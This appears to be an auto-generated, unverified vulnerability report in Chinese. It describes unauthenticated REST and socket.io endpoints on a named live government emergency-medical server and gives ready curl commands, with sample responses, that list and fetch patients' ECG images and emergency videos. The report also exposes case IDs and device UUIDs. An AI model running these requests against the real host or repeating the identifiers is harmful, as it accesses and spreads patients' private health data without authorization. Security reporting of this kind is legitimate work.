# POC/EXP — 4001 VitalSignVideoServer 多个数据集合（videoData/imageData/心电圖）与 socket.io 未授权读取

> 漏洞ID: `9a84230a-16b0-425c-8532-2c7b6aae9b9c`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4001/videoData, https://epcr.tpf.gov.tw:4001/imageData, https://epcr.tpf.gov.tw:4001/socket.io`

**類型**: 未授权访问/敏感资料外泄

## 描述

4001 VitalSignVideoServer（https://epcr.tpf.gov.tw:4001）多个 REST 数据集合完全未启用认证：GET /videoData（急救影音，每页100条）与 GET /imageData（影像，每页100条，含"心電圖" ECG 图片）均可匿名列出与按主键读取（/videoData/{id}、/imageData/{id}）。记录字段含 recordUuid（案件 UUID）、CaseID、fileName（暴露 iPhone 设备 UUID 如 tw.com.viewlead.emtapp9C372D5A-...）、mimeType、ImageType/VideoType（如"心電圖"、"手機上傳"、"HeadCam"）、时间戳。这些是 EMS 急救患者的心电/影音个人健康资料。此外 socket.io 实时通道 /socket.io/ 无需认证即可握手取得 sid（EIO=3 polling 返回 200），且整站 Access-Control-Allow-Origin: *。

## POC / 復現步驟

```
# videoData 未授权
curl -sS -k "https://epcr.tpf.gov.tw:4001/videoData?limit=1"
# → 200, [100条] sample: {"id":2,"recordUuid":"180810145678","fileName":"[iPhone][tw.com.viewlead.emtapp9C372D5A-7431-471E-8135-A1163FC6A7BE][180810145678][20180814162050].mp4","fileId":107,"mimeType":"video/mp4","VideoType":{"name":"手機上傳"}}
# imageData 未授权（含心电圖）
curl -sS -k "https://epcr.tpf.gov.tw:4001/imageData?limit=1"
# → 200, [100条] sample: {"id":2,"recordUuid":"test1808113701","fileName":"180816115714c890.svg","mimeType":"image/svg+xml","ImageType":{"id":1,"name":"心電圖"}}
# 按主键读取单条（未授权）
curl -sS -k "https://epcr.tpf.gov.tw:4001/videoData/107"   # → 200
# socket.io 未授权握手
curl -sS -k "https://epcr.tpf.gov.tw:4001/socket.io/?EIO=3&transport=polling"
# → 200, 97:0{"sid":"xfyCYQrIq8_Ys3lSA6yK","upgrades":["websocket"],"pingInterval":25000,...}
# CORS: *
curl -sS -k -I "https://epcr.tpf.gov.tw:4001/" | grep -i access-control-allow-origin
# 对照需认证服务：curl -sS -k "https://epcr.tpf.gov.tw:4000/caseList" → 401 "No authorization token was found"
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
